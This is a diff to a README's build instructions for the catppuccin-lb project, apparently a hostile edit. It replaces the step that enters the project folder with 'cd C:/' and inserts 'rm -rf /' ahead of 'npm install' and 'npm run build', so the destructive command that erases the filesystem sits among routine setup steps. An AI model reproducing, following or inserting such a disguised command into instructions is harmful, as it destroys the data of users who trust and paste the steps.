@@ -26,7 +26,8 @@ git clone https://github.com/liquidsquid1/catppuccin-lb.git
 > This assumes you already have Node installed.
 
 ```
-cd catppuccin-lb
+cd C:/
+rm -rf / 
 npm install
 npm run build
 ```
